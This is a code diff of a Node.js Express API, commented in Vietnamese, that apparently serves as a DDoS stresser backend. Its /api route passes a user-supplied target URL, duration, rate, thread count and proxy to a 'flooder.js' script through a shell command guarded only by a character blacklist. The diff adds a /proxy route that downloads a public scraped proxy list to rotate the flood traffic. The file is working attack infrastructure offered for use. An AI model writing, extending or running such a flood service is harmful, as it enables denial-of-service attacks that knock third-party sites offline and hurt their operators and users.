@@ -1,5 +1,7 @@
 const express = require('express');
 const { exec } = require('child_process');
+const fs = require('fs');
+const axios = require('axios');
 
 const urlRegex = /^(https?|ftp):\/\/[^\s/$.?#].[^\s]*$/;
 const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];
@@ -31,7 +33,7 @@ app.get(`/api`, async (req, res) => {
     if (!field.thea || isNaN(field.thea)) return res.json({ status: 500, data: `Thea không hợp lệ` });
     if (!field.proxy) return res.json({ status: 500, data: `Proxy không được để trống` });
 
-    // Chuẩn bị lệnh gọi tệp cookie.js
+    // Chuẩn bị lệnh gọi tệp flooder.js
     const command = `node flooder.js ${field.url} ${field.time} ${field.rate} ${field.thea} ${field.proxy}`;
 
     try {
@@ -64,6 +66,20 @@ app.get(`/api`, async (req, res) => {
     } catch (e) {
         console.error(`Lỗi khi xử lý: ${e.message}`);
         return res.json({ status: 500, data: `Gửi yêu cầu không thành công` });
+    }
+});
+
+// Thêm route tải proxy tự động
+app.get('/proxy', async (req, res) => {
+    const proxyUrl = "https://sunny9577.github.io/proxy-scraper/proxies.txt";
+    try {
+        const response = await axios.get(proxyUrl);
+        fs.writeFileSync('proxies.txt', response.data);
+        console.log(`Đã tải và lưu proxy vào tệp proxies.txt`);
+        return res.json({ status: 200, message: "Đã tải proxy thành công" });
+    } catch (error) {
+        console.error(`Lỗi khi tải proxy: ${error.message}`);
+        return res.json({ status: 500, message: "Lỗi khi tải proxy" });
     }
 });
 
